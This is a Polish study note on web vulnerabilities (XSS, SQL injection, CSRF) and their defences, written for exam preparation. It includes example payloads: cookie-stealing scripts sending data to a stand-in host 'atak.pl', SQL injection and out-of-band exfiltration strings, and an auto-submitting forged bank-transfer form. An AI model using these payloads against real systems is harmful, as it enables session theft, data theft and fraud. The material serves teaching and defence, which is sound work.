---
tags:
  - obrona
up: "[[Mapa zagadnień]]"
zagadnienie: 29
---
# 29. Przykładowe podatności środowisk webowych (XSS, SQLi, CSRF) i sposoby ochrony
---
> Podatności aplikacji webowych wynikają głównie z **mieszania danych z kodem** (wstrzyknięcia: SQLi, XSS) oraz z **niejawnego zaufania przeglądarki** do żądań wysyłanych z poświadczeniami użytkownika (CSRF). Klasyfikację najczęstszych zagrożeń publikuje **OWASP Top 10**.

## XSS – Cross-Site Scripting
> Wstrzyknięcie **złośliwego skryptu** (JavaScript) do strony, który wykonuje się w przeglądarce **ofiary** w kontekście (pochodzeniu) atakowanej aplikacji. SOP nie chroni, bo skrypt pochodzi „z tej samej strony” ([[28 Polityki Same Origin i Same Site]]).

### Skutki
kradzież ciasteczek sesji / tokenów z `localStorage` → przejęcie konta, wykonywanie akcji w imieniu ofiary (omija ochronę CSRF), keylogging, podmiana treści (phishing na zaufanej domenie), rozprzestrzenianie (robaki XSS – Samy/MySpace), eksfiltracja danych, skanowanie sieci wewnętrznej.

### Rodzaje
**1. Odbity** (_reflected_, nietrwały) – dane z żądania (parametr URL) od razu wstawione do odpowiedzi.
```php
<p>Wyniki dla: <?php echo $_GET['q']; ?></p>
```
Atak: ofiara klika spreparowany link
`https://sklep.pl/szukaj?q=<script>fetch('https://atak.pl/?c='+document.cookie)</script>`

**2. Składowany** (_stored_, trwały) – ładunek zapisany w bazie (komentarz, profil, wiadomość) i wyświetlany **wszystkim** odwiedzającym. Najgroźniejszy.
```html
Komentarz: <img src=x onerror="new Image().src='https://atak.pl/?c='+document.cookie">
```

**3. DOM-based** – podatność w **kodzie JavaScript po stronie klienta**: dane z niezaufanego źródła (_source_: `location.hash`, `document.referrer`, `postMessage`) trafiają do niebezpiecznego ujścia (_sink_: `innerHTML`, `document.write`, `eval`, `setTimeout(string)`, `element.src=javascript:`); serwer może w ogóle nie widzieć ładunku (fragment `#`).
```js
document.getElementById('msg').innerHTML = decodeURIComponent(location.hash.slice(1));
// https://app.pl/#<img src=x onerror=alert(1)>
```

Inne: **mutation XSS** (przeglądarka „naprawia” HTML po sanityzacji), **blind XSS** (ładunek wykonuje się w panelu administratora).

### Ochrona przed XSS
1. **Kodowanie wyjścia zależne od kontekstu** (_output encoding_) – najważniejsze:
   - treść HTML: `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;`, `"` → `&quot;`, `'` → `&#x27;`,
   - atrybut HTML: kodowanie + zawsze w cudzysłowach,
   - JavaScript: kodowanie `\xHH` / JSON serializacja, nigdy wstawianie w kod,
   - URL: `encodeURIComponent`, walidacja schematu (`http(s)`, nie `javascript:`),
   - CSS: kodowanie CSS.
2. **Automatyczne escapowanie w silnikach szablonów** (Jinja2, Thymeleaf, React JSX, Angular) – unikać „wyjść” (`dangerouslySetInnerHTML`, `|safe`, `v-html`, `bypassSecurityTrust`).
3. **Bezpieczne API DOM**: `textContent`, `setAttribute` zamiast `innerHTML`; **Trusted Types** (wymuszenie w CSP).
4. **Sanityzacja HTML** dla treści z formatowaniem – biblioteki z białą listą (DOMPurify, OWASP Java HTML Sanitizer); nigdy własne regexy.
5. **Walidacja wejścia** (typ, długość, format) – obrona dodatkowa, nie zastępuje kodowania.
6. **Content Security Policy** – ograniczenie skutków:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
   ```
   blokuje skrypty inline (bez nonce/hash), `eval`, obce domeny; `report-uri` do raportowania.
7. **Ciasteczka `HttpOnly`** (niedostępne dla JS – kradzież sesji utrudniona), `Secure`, `SameSite`; nie trzymać tokenów w `localStorage`.
8. `X-Content-Type-Options: nosniff`, poprawny `Content-Type` z `charset`.

---
## SQLi – SQL Injection
> Wstrzyknięcie fragmentu **kodu SQL** przez dane wejściowe, które są **konkatenowane** z zapytaniem. Atakujący zmienia logikę zapytania.

### Przykład
```java
String q = "SELECT * FROM users WHERE login = '" + login + "' AND pass = '" + pass + "'";
```
- `login = admin' -- ` → `... WHERE login = 'admin' -- ' AND pass = ''` – ominięcie hasła (reszta zakomentowana),
- `login = ' OR '1'='1` → warunek zawsze prawdziwy,
- `id = 1; DROP TABLE users; --` (stacked queries, jeśli sterownik pozwala).

### Skutki
ominięcie uwierzytelnienia, **odczyt całej bazy** (dane osobowe, skróty haseł), modyfikacja/usunięcie danych, eskalacja do systemu (`xp_cmdshell` w MSSQL, `LOAD_FILE`/`INTO OUTFILE` w MySQL, `COPY ... PROGRAM` w PostgreSQL), pivot w sieci.

### Rodzaje
| Rodzaj | Opis |
|---|---|
| **in-band UNION-based** | dołączenie wyników innego zapytania: `' UNION SELECT login, hash FROM users --` (dopasowanie liczby i typów kolumn, `ORDER BY n` do ustalenia liczby) |
| **error-based** | dane wydobywane z komunikatów błędów bazy (np. `extractvalue`, rzutowania) |
| **blind boolean-based** | brak wyświetlania danych; atakujący zadaje pytania tak/nie i obserwuje różnice w odpowiedzi: `' AND SUBSTRING(password,1,1)='a' --` |
| **blind time-based** | różnica w czasie: `' AND IF(SUBSTRING(pass,1,1)='a', SLEEP(5), 0) --`, `pg_sleep`, `WAITFOR DELAY` |
| **out-of-band** | eksfiltracja kanałem DNS/HTTP (`LOAD_FILE('\\\\x.atak.pl\\a')`) |
| **second-order** | dane bezpiecznie zapisane, ale później użyte w innym, podatnym zapytaniu |

Narzędzie testowe: **sqlmap**. Analogiczne wstrzyknięcia: NoSQL (`{"$ne": null}` w MongoDB), LDAP injection (`*)(uid=*))(|(uid=*`), OS command injection, XPath, ORM/HQL injection.

### Ochrona przed SQLi
1. **Zapytania parametryzowane / prepared statements** – dane przekazywane **oddzielnie** od kodu SQL, baza nie interpretuje ich jako składni:
   ```java
   PreparedStatement ps = conn.prepareStatement(
       "SELECT * FROM users WHERE login = ? AND pass_hash = ?");
   ps.setString(1, login);
   ps.setString(2, hash);
   ```
   ```python
   cur.execute("SELECT * FROM users WHERE login = %s", (login,))
   ```
2. **ORM / query builders** (JPA/Hibernate, SQLAlchemy, Entity Framework) – z parametrami, bez sklejania HQL/JPQL.
3. **Procedury składowane** – tylko, jeśli wewnątrz nie budują dynamicznego SQL.
4. **Walidacja białą listą** dla elementów, których nie da się sparametryzować (nazwy kolumn w `ORDER BY`, kierunek sortowania, nazwy tabel).
5. **Zasada najmniejszych uprawnień** konta aplikacji w bazie (brak `DROP`, dostęp tylko do potrzebnych tabel/widoków, osobne konta do odczytu/zapisu).
6. **Escapowanie** znaków specyficzne dla bazy – **ostateczność** (łatwo o błąd, kodowania znaków).
7. **Ukrywanie szczegółowych błędów** przed użytkownikiem (utrudnia error-based), logowanie po stronie serwera.
8. **WAF** (Web Application Firewall, np. ModSecurity + OWASP CRS) – dodatkowa warstwa, omijalna.
9. Hasła jako **skróty z solą** (Argon2/bcrypt) – ogranicza skutki wycieku.

---
## CSRF – Cross-Site Request Forgery
> Atak, w którym złośliwa witryna powoduje, że **przeglądarka ofiary wysyła żądanie** zmieniające stan do aplikacji, w której ofiara jest **zalogowana**. Przeglądarka automatycznie dołącza **ciasteczka sesji** (i uwierzytelnianie HTTP / certyfikaty klienta), więc serwer uznaje żądanie za legalne. Atakujący **nie widzi odpowiedzi** – liczy się efekt uboczny.

### Warunki
1. akcja zmieniająca stan (przelew, zmiana e-maila/hasła, dodanie administratora),
2. uwierzytelnienie wyłącznie przez dane automatycznie dołączane przez przeglądarkę (ciasteczka),
3. brak nieprzewidywalnych parametrów (atakujący zna wszystkie wartości żądania).

### Przykład
Bank: `POST https://bank.pl/przelew` z polami `na`, `kwota`. Ofiara zalogowana odwiedza stronę atakującego:
```html
<form action="https://bank.pl/przelew" method="POST" id="f">
  <input type="hidden" name="na" value="PL00 ATAKUJACY">
  <input type="hidden" name="kwota" value="10000">
</form>
<script>document.getElementById('f').submit();</script>
```
Przy akcji przez GET wystarczy: `<img src="https://bank.pl/przelew?na=...&kwota=10000">`.

Warianty: **login CSRF** (zalogowanie ofiary na konto atakującego), CSRF w routerach domowych (zmiana DNS), JSON CSRF (`text/plain` z treścią przypominającą JSON).

### Ochrona przed CSRF
1. **Token anty-CSRF (synchronizer token)** – losowy, nieprzewidywalny token powiązany z sesją, osadzony w formularzu/nagłówku i **weryfikowany na serwerze** przy każdym żądaniu zmieniającym stan. Atakujący nie zna go (SOP uniemożliwia odczyt strony z tokenem).
   ```html
   <input type="hidden" name="csrf_token" value="8f14e45fceea167a5a36dedd4bea2543">
   ```
   Wbudowane w frameworki (Spring Security, Django `{% csrf_token %}`, ASP.NET antiforgery).
2. **Double submit cookie** – token w ciasteczku i w parametrze/nagłówku; serwer porównuje (wersja podpisana HMAC odporna na wstrzyknięcie ciasteczka z subdomeny).
3. **Atrybut `SameSite`** ciasteczek sesji: `Lax` (domyślny) blokuje międzywitrynowe POST, `Strict` – wszystkie ([[28 Polityki Same Origin i Same Site#Atrybut ciasteczek SameSite (RFC 6265bis)]]).
4. **Weryfikacja nagłówków `Origin` / `Referer`** oraz **Fetch Metadata** (`Sec-Fetch-Site: cross-site` → odrzuć dla operacji zmieniających stan).
5. **Własne nagłówki** w API (`X-Requested-With`, `Authorization: Bearer` z tokenem z pamięci aplikacji) – formularz międzywitrynowy nie może ich ustawić, a `fetch` z nimi wymaga preflightu CORS.
6. **Poprawna semantyka HTTP** – **GET nigdy nie zmienia stanu** ([[13 Usługi sieciowe REST#Metody protokołu HTTP]]).
7. **Ponowne uwierzytelnienie / potwierdzenie** dla operacji krytycznych (hasło, kod SMS/OTP, podpis transakcji).
8. XSS **niweczy** ochronę CSRF (skrypt w tym samym pochodzeniu odczyta token) – ochrona przed XSS jest warunkiem.

## Porównanie
| | XSS | SQLi | CSRF |
|---|---|---|---|
| Cel ataku | przeglądarka użytkownika | baza danych serwera | akcje w aplikacji w imieniu użytkownika |
| Przyczyna | niezakodowane dane wstawione do HTML/JS | dane sklejone z zapytaniem SQL | zaufanie do ciasteczek dołączanych automatycznie |
| Wykonanie kodu | JS w kontekście strony | SQL w bazie | brak – tylko żądanie HTTP |
| Czy atakujący czyta odpowiedź | tak (skrypt w pochodzeniu ofiary) | tak / pośrednio (blind) | nie |
| Główna ochrona | kodowanie wyjścia, CSP, HttpOnly | zapytania parametryzowane | tokeny anty-CSRF, SameSite |

## OWASP Top 10 (2021)
1. **A01 Broken Access Control** – błędy autoryzacji (IDOR, eskalacja uprawnień, CORS),
2. **A02 Cryptographic Failures** – brak/słabe szyfrowanie danych,
3. **A03 Injection** – SQLi, NoSQL, OS command, LDAP, **XSS** (włączony do tej kategorii),
4. **A04 Insecure Design** – błędy projektowe (brak modelowania zagrożeń),
5. **A05 Security Misconfiguration** – domyślne hasła, zbędne usługi, szczegółowe błędy, XXE,
6. **A06 Vulnerable and Outdated Components** – podatne biblioteki,
7. **A07 Identification and Authentication Failures** – słabe uwierzytelnianie, zarządzanie sesją,
8. **A08 Software and Data Integrity Failures** – niezweryfikowane aktualizacje, niebezpieczna deserializacja, CI/CD,
9. **A09 Security Logging and Monitoring Failures**,
10. **A10 Server-Side Request Forgery (SSRF)**.

(W wersji 2017 CSRF nie był już w Top 10 dzięki ochronie wbudowanej we frameworki; XSS był osobną kategorią A7.)

## OWASP ASVS i modelowanie zagrożeń
Uzupełnienie [[OWASP ASVS]]:
- **ASVS** (_Application Security Verification Standard_) – katalog wymagań bezpieczeństwa do weryfikacji aplikacji:
  - **Poziom 1** – podstawowy, dla wszystkich aplikacji; weryfikowalny testami penetracyjnymi „z zewnątrz” (black-box),
  - **Poziom 2** – standardowy, dla aplikacji przetwarzających dane wrażliwe (większość aplikacji biznesowych),
  - **Poziom 3** – dla aplikacji krytycznych (bankowość, medycyna, infrastruktura) – wymaga analizy architektury i kodu.
  Rozdziały m.in.: architektura, uwierzytelnianie, sesje, kontrola dostępu, walidacja i kodowanie, kryptografia, obsługa błędów, ochrona danych, API.
- **CWE** (_Common Weakness Enumeration_) – katalog klas słabości (CWE-79 XSS, CWE-89 SQLi, CWE-352 CSRF); **CVE** – konkretne podatności w produktach; **CVSS** – ocena wagi.
- **STRIDE** (Microsoft) – kategorie zagrożeń przy modelowaniu:
  | Zagrożenie | Naruszana własność | Przykład | Zabezpieczenie |
  |---|---|---|---|
  | **S**poofing | uwierzytelnienie | podszycie się | uwierzytelnianie, MFA |
  | **T**ampering | integralność | modyfikacja danych/żądań | podpisy, MAC, walidacja |
  | **R**epudiation | niezaprzeczalność | wyparcie się akcji | logi audytowe, podpisy |
  | **I**nformation disclosure | poufność | wyciek danych | szyfrowanie, kontrola dostępu |
  | **D**enial of Service | dostępność | przeciążenie | limity, redundancja |
  | **E**levation of privilege | autoryzacja | eskalacja uprawnień | najmniejsze uprawnienia |
- Testowanie: **black-box** (brak wiedzy), **grey-box** (częściowa wiedza, dokumentacja), **white-box** (pełny dostęp do kodu i architektury) – [[Zaliczenie BSR]].
